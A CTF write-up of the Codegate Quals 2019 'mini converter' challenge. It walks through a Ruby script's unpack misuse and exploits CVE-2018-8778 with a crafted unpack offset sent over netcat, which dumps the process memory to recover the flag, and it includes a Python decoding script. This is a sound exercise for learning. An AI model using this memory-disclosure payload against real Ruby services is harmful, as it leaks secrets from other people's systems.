---
title: "mini converter - Codegate Quals 2019"
author: "pietroferretti"
comments: true
tags: codegate ctf mhackeroni ruby cve
---

>Can you read this? really???? lol

We have a small Ruby script and a TCP port to connect to.

```ruby
flag = "FLAG{******************************}"
# Can you read this? really???? lol

while true

    puts "[CONVERTER IN RUBY]"
    STDOUT.flush
    sleep(0.5)
    puts "Type something to convert\n\n"
    STDOUT.flush
    puts "[*] readme!"
    STDOUT.flush
    puts "When you want to type hex, contain '0x' at the first. e.g 0x41414a"
    STDOUT.flush
    puts "When you want to type string, just type string. e.g hello world"
    STDOUT.flush
    puts "When you want to type int, just type integer. e.g 102939"
    STDOUT.flush

    puts "type exit if you want to exit"
    STDOUT.flush

    input = gets.chomp
    puts input
    STDOUT.flush

    if input  == "exit"
        file_write()
        exit

    end

    puts "What do you want to convert?"
    STDOUT.flush

    if input[0,2] == "0x"
	    puts "hex"
        STDOUT.flush
	    puts "1. integer"
        STDOUT.flush
	    puts "2. string"
        STDOUT.flush

	    flag = 1
	
    elsif input =~/\D/
	    puts "string"
        STDOUT.flush
	    puts "1. integer"
        STDOUT.flush
	    puts "2. hex"
        STDOUT.flush

	    flag = 2
    
    else
	    puts "int"
        STDOUT.flush
	    puts "1. string"
        STDOUT.flush
	    puts "2. hex"
        STDOUT.flush

	    flag = 3
    end

    num = gets.to_i

    if flag == 1
	    if num == 1
		    puts "hex to integer"
            STDOUT.flush
            puts Integer(input)
            STDOUT.flush

    	elsif num == 2
		    puts "hex to string"
            STDOUT.flush
            tmp = []
            tmp << input[2..-1]
            puts tmp.pack("H*")
            STDOUT.flush
	    
        else
		    puts "invalid"
            STDOUT.flush
        end

    elsif flag == 2
	    if num == 1
		    puts "string to integer"
            STDOUT.flush
            puts input.unpack("C*#{input}.length")
            STDOUT.flush
	
        elsif num == 2
		    puts "string to hex"
            STDOUT.flush
            puts input.unpack("H*#{input}.length")[0]
            STDOUT.flush
	
        else
		    puts "invalid2"
            STDOUT.flush
        end

    elsif flag == 3
	    if num == 1
		    puts "int to string"
            STDOUT.flush
	
        elsif num == 2
		    puts "int to hex"
            STDOUT.flush
            puts input.to_i.to_s(16)
            STDOUT.flush
	    else
		    puts "invalid3"
            STDOUT.flush
        end

    else
	    puts "invalid4"
        STDOUT.flush

    end

end
```

The Ruby script's intended functionality apparently is to convert values to strings, integers and hexadecimal.

The bug is easily identifiable in the following lines:

```ruby
            puts input.unpack("C*#{input}.length")
[...]
            puts input.unpack("H*#{input}.length")[0]
```

In Ruby, `#{something}` is a template, which will be replaced by the value of `something`. 

Looks like the correct way to write those lines should have been with `length` inside the curly braces, to make it evaluate as the length of `input`. As it is now, `unpack` takes `input` itself as argument.

By itself unpack isn't insecure, but a quick Google search for "ruby unpack vulnerabilities" immediately gives a good candidate for exploitation:
[https://www.ruby-lang.org/en/news/2018/03/28/buffer-under-read-unpack-cve-2018-8778/](https://www.ruby-lang.org/en/news/2018/03/28/buffer-under-read-unpack-cve-2018-8778/)

On not so recent versions of ruby, passing big numbers as argument to unpack makes it possible to dump the memory of the program due to a wrong signed/unsigned conversion. This will probably let us retrieve the initial value of flag, even if the reference was overwritten.

### Dumping memory

```
$ (python -c "import sys; sys.stdout.write('@18446744073708351616C1200000\n1\n')"; cat -) | nc 110.10.147.105 12137 > dump.txt
```

### Converting the output to characters
The script outputs the result as single integers and floats. We can quickly convert those to actual characters.

```python
#!/usr/bin/env python2
import string
with open('dump.txt') as f:
    s = f.read()
out = ''
for line in s.split('\n'):
    try:
        c = chr(int(line))
        if c in string.printable:
            out += c
    except ValueError:
        continue
with open('dump2.txt', 'w') as g:
    g.write(out)
```

### Finding the flag
The last step is easy, we know the flag format.

```
$ cat dump2.txt | grep -i "FLAG{.*}"
FLAG{Run away with me.It'll be the way you want it}
```

